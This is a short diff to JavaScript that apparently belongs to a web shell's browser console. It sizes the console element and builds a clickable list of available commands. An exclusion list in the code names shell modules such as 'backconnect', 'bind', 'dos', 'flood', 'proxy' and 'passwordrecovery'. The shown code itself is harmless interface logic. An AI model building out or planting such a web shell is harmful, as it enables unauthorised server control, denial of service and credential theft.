@@ -1,4 +1,4 @@
-<script>window.onload=function()
+window.onload=function()
 {var oConsole=document.getElementById('console');var iHeight=innerHeight-320;var sHeight=((iHeight<100)?100:iHeight)+'px';oConsole.style.minHeight=sHeight;oConsole.style.height=sHeight;}
 var aExclude=new Array
 ('edit','upload','down','download','get','logout','bind','mysqldump','mysqldumper','mysqlbackup','passwordrecovery','pr','dos','flood','backconnect','bc','irc','proxy','emailvalidator');var aCommands=new Array
@@ -46,4 +46,4 @@ else
 {sOutput=sOutput.substring(0,sOutput.length-7);}
 oPrompt.innerHTML='<strong>Dostępne polecenia:</strong> '+sOutput;var oSpan=oPrompt.getElementsByTagName('span');for(i=0;i<oSpan.length;++i)
 {sName=oSpan[i].getAttribute('onclick');if(sName!=null)
-{oSpan[i].style.cursor='pointer';}}}</script>
+{oSpan[i].style.cursor='pointer';}}}
